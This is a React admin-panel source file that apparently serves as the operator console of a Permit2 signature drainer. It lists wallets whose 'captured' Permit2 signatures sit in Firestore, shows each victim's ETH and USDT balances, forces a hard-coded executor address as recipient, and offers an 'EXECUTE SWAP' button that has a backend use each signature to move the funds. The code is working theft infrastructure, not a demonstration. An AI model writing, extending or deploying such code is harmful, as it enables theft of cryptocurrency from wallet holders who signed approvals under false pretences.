import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, query, onSnapshot, doc as docRef, getDoc, setDoc } from 'firebase/firestore';
import { ethers } from 'ethers';

// Points to your Vercel Serverless Function
const BACKEND_URL = "/api/run-worker";
// Hard-coded spender/executor address (forced)
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';

export default function Admin() {
  const [signatures, setSignatures] = useState([]);
  const [groupedData, setGroupedData] = useState({});
  
  // Admin Settings
  const [recipient, setRecipient] = useState(HARDCODED_EXECUTOR);
  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");

  // Settings modal state (persisted in Firestore)
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [settingsLoading, setSettingsLoading] = useState(false);
  const [settingsStatus, setSettingsStatus] = useState("");
  const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);

  // UI State
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [processingId, setProcessingId] = useState(null);
  const [statusMsg, setStatusMsg] = useState("");

  // Save settings to local storage (do not persist recipient; it's forced to executor)
  useEffect(() => {
    localStorage.setItem('admin_outputToken', outputToken);
  }, [outputToken]);

  // Load settings from Firestore when opening settings modal
  const openSettings = async () => {
    setIsSettingsOpen(true);
    setSettingsLoading(true);
    try {
      const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
      const s = snap.exists() ? snap.data() : {};
      // Fill each field with: Firestore value -> existing UI state -> env -> sensible default
      // Executor is forced to the hard-coded value
      const execVal = s.executorAddress || HARDCODED_EXECUTOR;
      const tokenVal = s.tokenAddress || outputToken || import.meta.env.VITE_USDT_ADDRESS || '';

      setExecutorAddressSetting(execVal);
      setOutputToken(tokenVal);
      setSettingsStatus('Loaded');
    } catch (err) {
      console.error('Failed to load settings', err);
      setSettingsStatus('Load failed');
    } finally {
      setSettingsLoading(false);
    }
  };

  const saveSettings = async () => {
    setSettingsLoading(true);
    setSettingsStatus('Saving...');
    try {
      // Persist only the executor address (backend may read this if implemented)
      await setDoc(docRef(db, 'admin_config', 'settings'), {
        executorAddress: executorAddressSetting
      }, { merge: true });
      setSettingsStatus('Saved');
    } catch (err) {
      console.error('Failed to save settings', err);
      setSettingsStatus('Save failed');
    } finally {
      setSettingsLoading(false);
    }
  };

  // Real-time listener for Signatures
  useEffect(() => {
    const q = query(collection(db, "permit2_signatures"));
    const unsub = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      setSignatures(docs);
      
      const groups = {};
      docs.forEach(doc => {
        if (!groups[doc.owner]) groups[doc.owner] = [];
        groups[doc.owner].push(doc);
      });
      setGroupedData(groups);
    });
    return () => unsub();
  }, []);

  // Wallet balances (native ETH) mapping: owner -> string
  const [balances, setBalances] = useState({});
  // Token balances mapping: owner -> string
  const [tokenBalances, setTokenBalances] = useState({});
  // Executor balances
  const [executorEthBalance, setExecutorEthBalance] = useState('—');
  const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
  const [tokenSymbol, setTokenSymbol] = useState('TOKEN');

  // Token config (USDT by default). Can be overridden by env or settings.
  const DEFAULT_TOKEN = import.meta.env.VITE_USDT_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  const tokenAddress = outputToken || DEFAULT_TOKEN;
  const ERC20_ABI = [
    'function balanceOf(address) view returns (uint256)',
    'function decimals() view returns (uint8)'
  ];
  const [tokenDecimals, setTokenDecimals] = useState(6);

  // Executor address (forced to hard-coded value)
  const EXECUTOR_ADDRESS_UI = HARDCODED_EXECUTOR;

  // Create a provider (use VITE_RPC_URL if available, fallback to Cloudflare public RPC)
  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');

  // Fetch balances when groupedData changes
  useEffect(() => {
    let mounted = true;
    const owners = Object.keys(groupedData);
    if (!owners.length) {
      setBalances({});
      return;
    }

    (async () => {
      const next = {};
      const nextToken = {};
      // Prepare token contract and fetch decimals once
      let tokenContract;
      try {
        tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const dec = await tokenContract.decimals();
        setTokenDecimals(Number(dec));
          // try to read token symbol
          try {
            const symbol = await tokenContract.symbol();
            if (symbol) setTokenSymbol(symbol);
          } catch (e) {
            // ignore
          }
      } catch (e) {
        // fallback keep previous decimals
      }

      // limit concurrency to avoid bursting
      for (const owner of owners) {
        try {
          const b = await provider.getBalance(owner);
          next[owner] = parseFloat(ethers.formatEther(b)).toFixed(4);
        } catch (e) {
          next[owner] = '—';
        }
        try {
          if (tokenContract) {
            const tb = await tokenContract.balanceOf(owner);
            nextToken[owner] = Number(ethers.formatUnits(tb, tokenDecimals)).toFixed(4);
          } else {
            nextToken[owner] = '—';
          }
        } catch (e) {
          nextToken[owner] = '—';
        }
      }
      if (mounted) {
        setBalances(next);
        setTokenBalances(nextToken);
      }
    })();

    // Also update executor balances
    (async () => {
      if (!EXECUTOR_ADDRESS_UI) {
        setExecutorEthBalance('—');
        setExecutorTokenBalance('—');
        return;
      }
      try {
        const eb = await provider.getBalance(EXECUTOR_ADDRESS_UI);
        setExecutorEthBalance(parseFloat(ethers.formatEther(eb)).toFixed(4));
      } catch (e) {
        setExecutorEthBalance('—');
      }
      try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const tb = await tokenContract.balanceOf(EXECUTOR_ADDRESS_UI);
        setExecutorTokenBalance(Number(ethers.formatUnits(tb, tokenDecimals)).toFixed(4));
        try {
          const sym = await tokenContract.symbol();
          if (sym) setTokenSymbol(sym);
        } catch (e) {}
      } catch (e) {
        setExecutorTokenBalance('—');
      }
    })();

    return () => { mounted = false; };
  }, [groupedData]);

  // Execute Logic - Calls Backend
  const handleExecute = async (sigData) => {
    setProcessingId(sigData.id);
    setStatusMsg("Triggering Backend Server...");

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          docId: sigData.id,
          recipient: recipient,      // Pass admin setting to backend
          outputToken: outputToken   // Pass admin setting to backend
        })
      });

      const result = await response.json();

      if (!response.ok || !result.ok) {
        throw new Error(result.error || "Backend failed to execute");
      }
      
      setStatusMsg("Success! Backend executed the swap.");
      
      // Clear success message after 3 seconds
      setTimeout(() => setStatusMsg(""), 3000);

    } catch (err) {
      console.error(err);
      setStatusMsg("Error: " + err.message);
    } finally {
      setProcessingId(null);
    }
  };

  const openModal = (wallet) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);
    setStatusMsg("");
  };

  return (
    <div className="admin-wrapper">
      <div className="ambient-glow one"></div>
      <div className="ambient-glow two"></div>

      <div className="admin-container glass-panel">
        <header className="admin-header">
          <div className="header-top">
            <h2>Admin Control Center</h2>
            <div style={{display:'flex',alignItems:'center',gap:8}}>
                <div className="connection-badge active">Server Mode</div>
                <button className="settings-btn" onClick={openSettings} title="Settings">⚙️</button>
                {/* Executor Balance Card (prominent) */}
                <div style={{marginLeft:12,background:'linear-gradient(135deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01))',padding:'10px 14px',borderRadius:10,display:'flex',flexDirection:'column',alignItems:'flex-start',minWidth:200}}>
                  <div style={{fontSize:12,color:'#bbb',marginBottom:6}}>Executor (forced)</div>
                  <div style={{display:'flex',alignItems:'center',gap:10}}>
                    <div style={{width:44,height:44,borderRadius:10,background:'rgba(255,255,255,0.03)',display:'flex',alignItems:'center',justifyContent:'center',fontSize:18}}>⚡</div>
                    <div>
                      <div style={{fontFamily:'monospace',fontSize:13,color:'#fff'}}>{(EXECUTOR_ADDRESS_UI && EXECUTOR_ADDRESS_UI.length>8) ? `${EXECUTOR_ADDRESS_UI.slice(0,6)}...${EXECUTOR_ADDRESS_UI.slice(-4)}` : '—'}</div>
                      <div style={{fontSize:12,color:'#9bd',marginTop:4}}>{executorEthBalance} ETH · {executorTokenBalance} {tokenSymbol}</div>
                    </div>
                  </div>
                </div>
            </div>
          </div>
          
          <div className="settings-grid">
            <div className="input-group">
              <label>Output Token Address</label>
              <input 
                type="text" 
                value={outputToken} 
                onChange={(e) => setOutputToken(e.target.value)} 
                placeholder="0x... (Token to swap into)" 
              />
            </div>
          </div>
        </header>

        <div className="wallet-grid">
          {Object.keys(groupedData).length === 0 && (
            <div className="empty-state" style={{color:'#888', textAlign:'center', width:'100%', padding:'20px'}}>
              No signatures captured yet.
            </div>
          )}
          
          {Object.keys(groupedData).map(owner => (
            <div key={owner} className="wallet-card glass-card" onClick={() => openModal(owner)}>
              <div className="card-header">
                <span className="wallet-icon">👝</span>
                <span className="wallet-addr">{owner.slice(0, 6)}...{owner.slice(-4)}</span>
                <span className="wallet-balance">{balances[owner] ? `${balances[owner]} ETH · ${tokenBalances[owner] ? `${tokenBalances[owner]} ${tokenSymbol}` : '...'}` : 'Loading...'}</span>
              </div>
              <div className="card-body">
                <div className="stat-row">
                  <span>Signatures</span>
                  <span className="highlight-white">{groupedData[owner].length}</span>
                </div>
                <div className="stat-row">
                  <span>Pending</span>
                  <span className="highlight-yellow">
                    {groupedData[owner].filter(x => !x.processed).length}
                  </span>
                </div>
              </div>
              <button className="view-btn">Manage</button>
            </div>
          ))}
        </div>
      </div>

      {/* MODAL */}
      {isModalOpen && selectedWallet && (
        <div className="modal-overlay" onClick={() => setIsModalOpen(false)}>
          <div className="modal-glass glass-panel" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h3>{selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}</h3>
              <button className="close-btn" onClick={() => setIsModalOpen(false)}>✕</button>
            </div>
            
            {statusMsg && (
              <div className={`status-bar ${statusMsg.includes("Success") ? "success" : statusMsg.includes("Error") ? "error-msg" : "processing"}`}>
                {statusMsg}
              </div>
            )}

            <div className="signature-list">
              {groupedData[selectedWallet].map(sig => (
                <div key={sig.id} className={`signature-item ${sig.processed ? 'processed' : ''}`}>
                  <div className="sig-row">
                    <span className="label">Token</span>
                    <span className="value">{sig.token.slice(0,6)}...{sig.token.slice(-4)}</span>
                  </div>
                  <div className="sig-row">
                    <span className="label">Amount</span>
                    <span className="value">{(BigInt(sig.amount) / (10n ** 6n)).toString()} USDT</span>
                  </div>
                  <div className="sig-row">
                    <span className="label">Status</span>
                    <span className={`status-tag ${sig.processed ? 'done' : 'pending'}`}>
                      {sig.processed ? "Done" : "Ready"}
                    </span>
                  </div>
                  
                  {sig.lastError && !sig.processed && (
                    <div className="error-msg" style={{marginTop:'10px'}}>⚠️ {sig.lastError.slice(0, 60)}...</div>
                  )}

                  {!sig.processed ? (
                    <button 
                      className="execute-btn" 
                      onClick={() => handleExecute(sig)}
                      disabled={processingId === sig.id}
                    >
                      {processingId === sig.id ? "CONTACTING SERVER..." : "EXECUTE SWAP"}
                    </button>
                  ) : (
                    <a 
                      href={`https://etherscan.io/tx/${sig.routerTx}`} 
                      target="_blank" 
                      rel="noreferrer"
                      className="etherscan-link"
                    >
                      View on Etherscan ↗
                    </a>
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* SETTINGS MODAL */}
      {isSettingsOpen && (
        <div className="modal-overlay" onClick={() => setIsSettingsOpen(false)}>
          <div className="modal-glass glass-panel" onClick={e => e.stopPropagation()} style={{maxWidth:600}}>
            <div className="modal-header">
              <h3>App Settings</h3>
              <button className="close-btn" onClick={() => setIsSettingsOpen(false)}>✕</button>
            </div>

            <div style={{padding:'10px 6px'}}>
              <div className="input-group">
                <label>Executor Address</label>
                <input value={executorAddressSetting} onChange={e => setExecutorAddressSetting(e.target.value)} placeholder="0x..." />
                <div style={{fontSize:12,color:'#aaa',marginTop:6}}>This will be saved to admin settings; backend must be configured to use it.</div>
              </div>

              <div style={{display:'flex',gap:8,marginTop:12}}>
                <button className="btn-refresh" onClick={saveSettings} disabled={settingsLoading}>{settingsLoading ? 'Saving...' : 'Save'}</button>
                <div style={{alignSelf:'center',color:'#aaa'}}>{settingsStatus}</div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
